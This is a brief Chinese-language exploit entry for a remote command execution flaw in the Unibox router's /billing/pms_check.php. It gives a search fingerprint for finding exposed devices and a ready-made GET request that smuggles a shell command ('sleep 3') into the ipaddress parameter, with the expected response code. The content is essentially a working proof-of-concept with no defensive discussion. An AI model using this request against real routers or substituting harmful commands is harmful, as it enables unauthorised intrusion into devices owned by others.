# Unibox路由器pms_check.php存在远程命令执行漏洞

Unibox ｜ 命令执行 ｜ —
- **指纹**：`body="Unibox"`
- **请求**：`GET /billing/pms_check.php?ipaddress=1;sleep%203; HTTP/1.1`
- **响应特征**：200